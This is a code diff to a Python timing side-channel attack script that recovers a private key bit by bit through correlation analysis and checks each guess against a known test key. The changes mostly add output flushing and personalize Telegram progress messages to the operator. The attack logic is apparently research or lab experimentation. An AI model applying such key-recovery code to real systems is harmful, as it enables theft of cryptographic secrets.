@@ -22,7 +22,7 @@ def check_bot():
         for line in f_chat:
             word = line.split()
             if word[0] == os.environ.get('USER'):
-                id = word[1]
+                id = word[1:]
                 f_chat.close()
                 return True, id
         f_chat.close()
@@ -74,7 +74,7 @@ def main_attack():
     t_mean = np.mean(T_in)
     t_variance = np.std(T_in)
     coeff = 0.25
-    extr = 1
+    extr = 0.5
     tail = 3
 
     messages = list()
@@ -86,10 +86,10 @@ def main_attack():
             T_arr.append(time)
             messages.append(m)
 
-    print("Read messages: {} samples; -- After filtering {} samples".format(len(T_in),len(T_arr)))
+    print("Read messages: {} samples; -- After filtering {} samples".format(len(T_in),len(T_arr)), flush=True)
     if chat_on:
-        sms_in = "Read messages: {} samples; -- After filtering {} samples".format(len(T_in),len(T_arr))
-        telegram_bot_sendtext(sms_in, chat_id)
+        sms_in = "{}, starting your test.\nRead messages: {} samples\nAfter filtering {} samples".format(chat_id[1], len(T_in),len(T_arr))
+        telegram_bot_sendtext(sms_in, chat_id[0])
     # Final to revert the key, as we start from LSB, just for testing with one bit at a time
     private_key_bit = padbin(private)[::-1]
     #public_key_bit = padbin(public)[::-1]
@@ -135,7 +135,7 @@ def main_attack():
 
             #print("{}: PCC = {} ".format(bin(i)[2:].zfill(bits_considered), value))
         for k in sorted(pcc_dic.keys()):
-            print("{:4}: PCC = {:7.6f} ".format(k, pcc_dic[k]))
+            print("{:4}: PCC = {:7.6f} ".format(k, pcc_dic[k]), flush=True)
 
         maxim = max(pcc_grouped)
         guess_iter = pcc_grouped.index(maxim)
@@ -145,10 +145,10 @@ def main_attack():
         else:
             step = nb_key
 
-        print("Choice: {:4} PCC: {:7.6f}".format(bin(guess_iter)[2:].zfill(bits_guessed), maxim))
+        print("Choice: {:4} PCC: {:7.6f}".format(bin(guess_iter)[2:].zfill(bits_guessed), maxim), flush=True)
         key_guessed.extend(bin(guess_iter)[2:].zfill(bits_guessed)[::-1])
-        print('Step: {:>3}'.format(step))
-        print(''.join(key_guessed))
+        print('Step: {:>3}'.format(step), flush=True)
+        print(''.join(key_guessed), flush=True)
         print(''.join(private_key_bit[:step]), flush=True)
         error = 0
         for j in range(step):
@@ -158,8 +158,8 @@ def main_attack():
             print("Houston, we have a problem -- error: {}".format(error), flush=True)
 
         if chat_on:
-            sms = 'Step {:4} -> error: {:4}'.format(step, error)
-            telegram_bot_sendtext(sms, chat_id)
+            sms = '{}: Step {:4} -> error: {:4}'.format(chat_id[1], step, error)
+            telegram_bot_sendtext(sms, chat_id[0])
 
         for msg in init_coll[guess_iter]:
             msg.revert(bits_considered-bits_guessed)
@@ -168,10 +168,10 @@ def main_attack():
         init_coll = [copy.deepcopy(msg_restart) for i in range(2**bits_considered)]
 
     final_key = int(''.join(map(str, key_guessed[::-1])), 2)
-    print("Secret unveiled: the key is\n {}".format(hex(final_key)))
+    print("Secret unveiled: the key is\n {}".format(hex(final_key)), flush=True)
     if chat_on:
-        sms_end = 'End reached {:4} bits -> error: {:4}\nThe key is:\n{}'.format(step, error, hex(final_key))
-        telegram_bot_sendtext(sms_end, chat_id)
+        sms_end = 'Hey {}, we have finished!\nEnd reached {:4} bits -> error: {:4}\nThe key is:\n{}'.format(chat_id[1], step, error, hex(final_key))
+        telegram_bot_sendtext(sms_end, chat_id[0])
     return
 
 
